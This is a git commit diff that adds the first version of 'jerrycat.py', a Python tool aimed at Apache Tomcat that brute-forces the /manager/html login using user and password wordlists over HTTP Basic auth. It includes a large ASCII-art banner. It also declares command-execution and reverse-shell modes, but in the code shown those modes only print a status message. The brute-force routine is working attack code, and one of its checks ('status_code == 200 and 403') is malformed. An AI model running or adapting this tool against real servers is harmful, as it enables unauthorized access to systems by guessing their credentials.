19f5fc6d7f9226bf8b758ae8921f8097587549e1
4nh4ck1ne <125875013+Anh4ckin3@users.noreply.github.com>
2024-04-29 17:29:17 +0200

    Update jerrycat.py and add the initial code

--- jerrycat.py
+++ jerrycat.py
@@ -1,6 +1,138 @@
-def print_hi(name):
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+import argparse
+import requests
+from requests.auth import HTTPBasicAuth
+from rich.console import Console
+from tqdm import tqdm
+from termcolor import *
+from rich.text import Text
 
-if __name__ == '__main__':
-    print_hi('Toto')
+# Brute force mode fonction
+def brute(url, userlist, wordlist):
 
+    userlist = userlist or 'tomcat'
+    # without user list
+    if userlist == 'tomcat':
+        with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
+            for password in tqdm(open_wordlist):
+                password = password.strip()  # remove space or bad space
+                auth = HTTPBasicAuth('tomcat', password)
+                r = requests.get(f"{url}/manager/html", auth=auth)
+                if r.status_code == 200:
+                    return 'tomcat', password
+    # with user list
+    else:
+        with open(userlist, "r", encoding="utf-8", errors="ignore") as open_userlist:
+            with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
+                for user in tqdm(open_userlist, desc="BrutForce Status"):
+                    user = user.strip()  # remove space or bad space
+                    open_wordlist.seek(0)  # go back on the file
+                    for password in open_wordlist:
+                        password = password.strip()  # remove space or bad space
+                        auth = HTTPBasicAuth(user, password)
+                        r = requests.get(f"{url}/manager/html", auth=auth)
+                        if r.status_code == 200 and 403:
+                            return user, password
+   
+    return False 
+
+
+
+def banner():
+    banner = '''
+    
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
+⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
+⠀⠃⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
+⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢲⣤⣀⣀⣈⣻⣿⣿⠎⠻⣤⠟⠁⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
+⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⢀⣠⡴⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣠⠀⠀⠀⠀⠀⠀⠀⢰⠃
+⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣾⣀⣀⣀⣤⠟⠃⠀⠀⠀⠀⠀⠀⢠⡏⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠛⠻⠂⠀⠀⠀⠀⠀⠈⢉⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⣶⣄⠀⠀⠀⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠛⠀⢰⡄⣶⠀⠀⠀⢀⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⠈⢿⣤⣀⣀⣀⣀⣤⠞⠋⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡶⢦⣄⡈⣷⣿⣀⣠⠶⠋⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⠬⠽⠟⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢸⡀⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣾⡁⠀⠀⠀⢠⡏⢀⡴⠋⠁⠀⠀⠀⢈⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⣠⡾⣷⠏⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠙⢿⠷⠤⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡼⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⠃⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠉⠙⠒⠒⠒⠒⠒⠒⠒⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+                                                  JerryCat By Anh4ckin3 & Talace
+
+'''
+
+    return banner
+
+
+def main():
+
+    parser = argparse.ArgumentParser(description="jerrycat the good guy !")
+    group = parser.add_mutually_exclusive_group()
+    group.add_argument("-v", "--verbose", action="store_true")
+
+    # chose mode
+    parser.add_argument("mode", choices=["brute", "exec", "reverse"], help="Mode: bruteforce, commande, or reverse shell")
+    parser.add_argument('-u', '--url', dest='url', help='url of the tomcat app')
+
+    # Brute mode
+    brute_mode = parser.add_argument_group("Brute Options")
+    parser.add_argument('-w', '--wordlist', dest='wordlist', help='path on your own wordlist')
+    parser.add_argument('-l', '--user-list', dest='userlist', help='User list ( default tomcat )')
+
+    # exec mode
+    exec_mode = parser.add_argument_group("Commande execution Options")
+    parser.add_argument('-U', '--user', dest='user', help='tomcat user')
+    parser.add_argument('-p', '--password', dest='password', help='tomcat user password')
+
+    # reverse shell mode
+    reverse_mode = parser.add_argument_group("reverse shell Options")
+    reverse_mode.add_argument('-R', '--reverse', dest='reverse', help='path to your reverse shell payload')
+
+
+    args = parser.parse_args()
+
+    # settings for brute mode
+    if args.mode == "brute":
+        if not all([args.url, args.wordlist]):
+            parser.error(" -u and -w arguments are requises for this mode.")
+        else :
+            print(banner())
+            cprint("[+]", "green", end="")
+            print(" Mode Brute selected")
+            url = args.url
+            userlist = args.userlist
+            passwords = args.wordlist
+            cprint("[*]", "blue", end="")
+            print(' Brute force is running...')
+            run_bf = brute(url, userlist, passwords)
+            if run_bf == False:
+                cprint("[-]", "red", end="")
+                print(" No user or password is match ! :(")
+            else :
+                cprint("[+]", "green", end="")
+                print(f" find user and password : {run_bf[0]}:{run_bf[1]}") 
+
+    # settings for exec mode
+    elif args.mode == "exec":
+        if not all([args.url, args.user, args.password]):
+            parser.error("-u, -U, -p arguments are requises for this mode.")
+        else : 
+            print("Comand execution mode selected")
+
+    # settings for reverse mode
+    elif args.mode == "reverse":
+        if not all([args.url, args.user, args.password, args.reverse]):
+            parser.error("-u, -U, -p arguments are requises for this mode.")
+        else:
+            print("Reverse shell mode selected")
+
+if __name__ == "__main__":
+    main()
